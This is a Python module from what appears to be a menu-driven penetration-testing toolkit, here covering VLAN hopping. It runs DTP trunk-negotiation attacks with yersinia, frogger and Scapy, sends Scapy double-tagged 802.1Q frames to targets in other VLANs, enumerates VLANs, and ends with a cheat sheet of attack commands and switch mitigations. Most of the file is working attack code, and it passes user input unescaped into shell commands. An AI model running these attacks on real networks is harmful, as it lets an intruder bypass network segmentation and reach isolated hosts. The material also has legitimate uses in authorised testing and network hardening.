"""VLAN Hopper Module - VLAN escape attacks via DTP, double-tagging, and VLAN enumeration."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "vlan_hop"


def _dtp_attack(session):
    """DTP (Dynamic Trunking Protocol) attack to force trunk mode."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    warning("[!] This sends DTP frames to negotiate trunk mode on the switch port.")
    info("If successful, you'll receive traffic from all VLANs.")

    options = [
        ("1", "[bold]Yersinia DTP[/bold]     - DTP attack via yersinia"),
        ("2", "[bold]Frogger[/bold]           - Automated VLAN hopping"),
        ("3", "[bold]Manual DTP[/bold]        - Scapy DTP frame"),
    ]
    choice = show_menu(options)

    if choice == "1":
        cmd = f"yersinia dtp -attack 1 -interface {iface}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "2":
        cmd = f"frogger -i {iface}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "3":
        cmd = f'python3 -c "from scapy.all import *; from scapy.contrib.dtp import *; negotiate_trunk(iface=\\"{iface}\\")"'
        run_with_preview(cmd, session, STAGE)


def _double_tagging(session):
    """Double-tagging (802.1Q-in-802.1Q) VLAN hop attack."""
    iface = ask("Enter network interface")
    native_vlan = ask("Enter native VLAN ID (usually 1)", default="1")
    target_vlan = ask("Enter target VLAN ID to reach")
    target_ip = ask("Enter target IP in remote VLAN")

    if not all([iface, target_vlan, target_ip]):
        error("All parameters required.")
        return

    warning("[!] Double-tagging only works in one direction (no return traffic).")
    info(f"Crafting double-tagged frame: Native VLAN {native_vlan} → Target VLAN {target_vlan}")

    cmd = (
        f'python3 -c "'
        f"from scapy.all import *; "
        f"pkt = Ether()/Dot1Q(vlan={native_vlan})/Dot1Q(vlan={target_vlan})/IP(dst='{target_ip}')/ICMP(); "
        f"sendp(pkt, iface='{iface}', count=5); "
        f"print('Sent 5 double-tagged frames')"
        f'"'
    )
    run_with_preview(cmd, session, STAGE)


def _vlan_enum(session):
    """Enumerate VLANs on the network."""
    iface = ask("Enter network interface")

    options = [
        ("1", "[bold]CDP/LLDP sniff[/bold]  - Capture switch advertisements"),
        ("2", "[bold]DTP sniff[/bold]       - Capture DTP frames"),
        ("3", "[bold]ARP sweep[/bold]       - Discover hosts per VLAN"),
        ("4", "[bold]Nmap VLAN scan[/bold]  - Scan for VLAN-related info"),
    ]
    choice = show_menu(options)

    cmds = {
        "1": f"tcpdump -i {iface} -nn -v -c 20 'ether proto 0x88cc or ether dst 01:00:0c:cc:cc:cc'",
        "2": f"tcpdump -i {iface} -nn -v -c 10 'ether dst 01:00:0c:cc:cc:cc'",
        "3": f"arp-scan -I {iface} -l",
        "4": f"nmap --script broadcast-listener -e {iface}",
    }
    if choice in cmds:
        run_with_preview(cmds[choice], session, STAGE)


def _create_vlan_interface(session):
    """Create a VLAN sub-interface to access a specific VLAN."""
    iface = ask("Enter base interface (e.g., eth0)")
    vlan_id = ask("Enter VLAN ID")
    ip_addr = ask("Enter IP address for VLAN interface (e.g., 10.10.10.2/24)")

    if not all([iface, vlan_id]):
        error("Interface and VLAN ID required.")
        return

    info(f"Creating VLAN interface {iface}.{vlan_id}")

    cmds = [
        f"modprobe 8021q",
        f"vconfig add {iface} {vlan_id}",
        f"ip link set up dev {iface}.{vlan_id}",
    ]
    if ip_addr:
        cmds.append(f"ip addr add {ip_addr} dev {iface}.{vlan_id}")

    for cmd in cmds:
        run_with_preview(cmd, session, STAGE)

    success(f"VLAN interface {iface}.{vlan_id} created.")
    info(f"To remove: vconfig rem {iface}.{vlan_id}")


def _remove_vlan_interface(session):
    """Remove a VLAN sub-interface."""
    iface = ask("Enter VLAN interface to remove (e.g., eth0.100)")
    if not iface:
        error("Interface required.")
        return
    cmd = f"vconfig rem {iface}"
    run_with_preview(cmd, session, STAGE)


def _cheat_sheet():
    """VLAN hopping cheat sheet."""
    content = """# VLAN Hopping Cheat Sheet

## Attack Types

### 1. Switch Spoofing (DTP Attack)
- Attacker sends DTP frames to negotiate trunk mode
- If switch port is set to "dynamic auto" or "dynamic desirable", it becomes trunk
- **Tool**: yersinia, frogger, scapy

### 2. Double Tagging (802.1Q-in-802.1Q)
- Works when attacker is on native VLAN
- Outer tag = native VLAN (stripped by first switch)
- Inner tag = target VLAN (forwarded by second switch)
- **Limitation**: One-way only (no return path)

## Commands
```
# DTP attack with yersinia
yersinia dtp -attack 1 -interface eth0

# Create VLAN interface
modprobe 8021q
vconfig add eth0 100
ip link set up dev eth0.100
ip addr add 10.10.100.2/24 dev eth0.100

# Sniff for CDP/LLDP
tcpdump -i eth0 -nn -v 'ether proto 0x88cc'

# Scapy double-tag
sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="target")/ICMP())
```

## Mitigations
- Set all unused ports to access mode (`switchport mode access`)
- Disable DTP (`switchport nonegotiate`)
- Use a dedicated VLAN for trunking (not VLAN 1)
- Enable VLAN access lists (VACLs)
- Use private VLANs for isolation

## Tools: yersinia, frogger, scapy, vconfig
"""
    show_knowledge(content)


def run(session):
    """VLAN Hopper module entry point."""
    show_stage_header("VLAN Hopper", "VLAN escape attacks — DTP, double-tagging, and VLAN enumeration")

    while True:
        options = [
            ("1", "[bold]DTP Attack[/bold]        - Force switch trunk mode"),
            ("2", "[bold]Double Tagging[/bold]    - 802.1Q-in-802.1Q hop"),
            ("3", "[bold]VLAN Enumeration[/bold]  - Discover VLANs on network"),
            ("4", "[bold]Create VLAN IF[/bold]    - Add VLAN sub-interface"),
            ("5", "[bold]Remove VLAN IF[/bold]    - Delete VLAN sub-interface"),
            ("6", "[bold]Cheat Sheet[/bold]       - VLAN hopping reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _dtp_attack(session)
        elif choice == "2":
            _double_tagging(session)
        elif choice == "3":
            _vlan_enum(session)
        elif choice == "4":
            _create_vlan_interface(session)
        elif choice == "5":
            _remove_vlan_interface(session)
        elif choice == "6":
            _cheat_sheet()
